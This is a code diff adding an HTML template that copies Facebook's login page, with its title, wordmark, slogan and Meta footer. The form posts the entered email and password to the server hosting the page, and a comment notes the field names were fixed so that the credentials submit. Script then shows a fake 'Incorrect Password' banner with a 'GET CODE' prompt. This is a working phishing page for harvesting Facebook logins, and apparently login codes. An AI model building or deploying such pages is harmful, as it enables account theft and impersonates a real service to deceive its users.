@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── DESKTOP LAYOUT ── */
+    .page-wrap {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px;
+      gap: 32px;
+    }
+
+    /* LEFT COLUMN */
+    .left-col {
+      max-width: 480px;
+      padding-bottom: 60px;
+    }
+    .fb-wordmark {
+      font-family: 'Georgia', serif;
+      font-size: 60px;
+      font-weight: 700;
+      color: #1877f2;
+      line-height: 1;
+      margin-bottom: 20px;
+      letter-spacing: -1px;
+    }
+    .slogan {
+      font-size: 26px;
+      line-height: 1.4;
+      color: #1c1e21;
+      font-weight: 400;
+    }
+
+    /* RIGHT CARD */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px;
+      width: 100%;
+      max-width: 396px;
+    }
+
+    /* ERROR BANNER */
+    .error-banner {
+      display: none;
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      animation: slideDown .25s ease;
+    }
+    .error-banner.visible { display: block; }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .error-title {
+      font-weight: 700;
+      font-size: 15px;
+      color: #1c1e21;
+      margin-bottom: 6px;
+    }
+    .error-msg {
+      font-size: 14px;
+      color: #444950;
+      line-height: 1.5;
+      margin-bottom: 12px;
+    }
+    .error-actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 20px;
+    }
+    .btn-get-code {
+      background: none;
+      border: none;
+      color: #f02849;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      letter-spacing: .5px;
+      padding: 4px 0;
+    }
+    .btn-get-code:hover { text-decoration: underline; }
+    .btn-ok {
+      background: none;
+      border: none;
+      color: #1877f2;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      letter-spacing: .5px;
+      padding: 4px 0;
+    }
+    .btn-ok:hover { text-decoration: underline; }
+
+    /* FORM INPUTS */
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      outline: none;
+      color: #1c1e21;
+      background: #fff;
+      margin-bottom: 12px;
+      transition: border-color .15s;
+    }
+    .input-field:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
+    .input-field::placeholder { color: #90949c; }
+
+    /* BUTTONS */
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background .15s, transform .08s;
+      margin-bottom: 16px;
+    }
+    .btn-login:hover  { background: #166fe5; }
+    .btn-login:active { transform: scale(.98); }
+
+    .link-forgot {
+      display: block;
+      text-align: center;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+    .link-forgot:hover { text-decoration: underline; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin-bottom: 20px;
+    }
+
+    .btn-new-account {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 14px 24px;
+      background: #42b72a;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background .15s, transform .08s;
+      text-align: center;
+    }
+    .btn-new-account:hover  { background: #36a420; }
+    .btn-new-account:active { transform: scale(.98); }
+
+    /* META FOOTER */
+    .meta-footer {
+      text-align: center;
+      color: #737373;
+      font-size: 13px;
+      padding: 28px 16px 16px;
+    }
+    .meta-footer span {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-weight: 500;
+    }
+    .meta-logo {
+      font-size: 16px;
+      font-weight: 900;
+      color: #737373;
+      letter-spacing: -0.5px;
+    }
+
+    /* TOAST */
+    #toast {
+      position: fixed;
+      bottom: 32px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: rgba(0,0,0,.82);
+      color: #fff;
+      padding: 12px 22px;
+      border-radius: 24px;
+      font-size: 14px;
+      white-space: nowrap;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .25s, transform .25s;
+      z-index: 9999;
+    }
+    #toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    /* ── MOBILE LAYOUT ── */
+    @media (max-width: 680px) {
+      .page-wrap {
+        flex-direction: column;
+        align-items: center;
+        padding: 20px 16px 0;
+        gap: 16px;
+      }
+      .left-col {
+        text-align: center;
+        padding-bottom: 0;
+        max-width: 100%;
+      }
+      .fb-wordmark { font-size: 42px; margin-bottom: 8px; }
+      .slogan { font-size: 18px; }
+      .card { max-width: 100%; }
+      .btn-login { font-size: 17px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-wrap">
+
+  <!-- LEFT COLUMN (desktop only) -->
+  <div class="left-col">
+    <div class="fb-wordmark">facebook</div>
+    <p class="slogan">Connect with friends and the world around you on Facebook.</p>
+  </div>
+
+  <!-- RIGHT CARD -->
+  <div class="card">
+
+    <!-- Error banner (hidden by default) -->
+    <div class="error-banner" id="errorBanner">
+      <div class="error-title">Incorrect Password</div>
+      <div class="error-msg">The password you entered is incorrect. Please try again or get a code to log in.</div>
+      <div class="error-actions">
+        <button class="btn-get-code" onclick="handleGetCode()">GET CODE</button>
+        <button class="btn-ok"       onclick="dismissError()">OK</button>
+      </div>
+    </div>
+
+    <!-- Login form - FIXED: Added name attributes -->
+    <form method="post" action="">
+      {% csrf_token %}
+      <input
+        type="text"
+        class="input-field"
+        id="phoneField"
+        name="email"
+        value=""
+        placeholder="Mobile number or email"
+        autocomplete="username"
+      />
+
+      <input
+        type="password"
+        class="input-field"
+        id="passwordField"
+        name="password"
+        placeholder="Password"
+        autocomplete="current-password"
+      />
+
+      <button type="submit" class="btn-login" id="loginBtn">Log in</button>
+    </form>
+
+    <a class="link-forgot" onclick="showToast('Non-functional demo')">Forgot password?</a>
+
+    <hr class="divider" />
+
+    <button class="btn-new-account" onclick="showToast('Non-functional demo')">Create new account</button>
+
+  </div>
+</div>
+
+<!-- META FOOTER -->
+<div class="meta-footer">
+  <span>
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="#737373">
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-4H7l5-8v4h4l-5 8z"/>
+    </svg>
+    <span class="meta-logo">Meta</span>
+  </span>
+</div>
+
+<!-- Toast notification -->
+<div id="toast"></div>
+
+<script>
+  const errorBanner  = document.getElementById('errorBanner');
+  const loginBtn     = document.getElementById('loginBtn');
+  const passwordField = document.getElementById('passwordField');
+  const toast        = document.getElementById('toast');
+  let toastTimer;
+
+  function showError() {
+    errorBanner.classList.remove('visible');
+    // Force reflow so animation replays
+    void errorBanner.offsetWidth;
+    errorBanner.classList.add('visible');
+    errorBanner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  function dismissError() {
+    errorBanner.classList.remove('visible');
+  }
+
+  
+  function showToast(msg) {
+    clearTimeout(toastTimer);
+    toast.textContent = msg;
+    toast.classList.add('show');
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
+  }
+
+  // Click
+  loginBtn.addEventListener('click', showError);
+
+  // Enter key from password field
+  passwordField.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') showError();
+  });
+
+  // Enter key from phone field moves to password
+  document.getElementById('phoneField').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') passwordField.focus();
+  });
+</script>
+</body>
+</html>
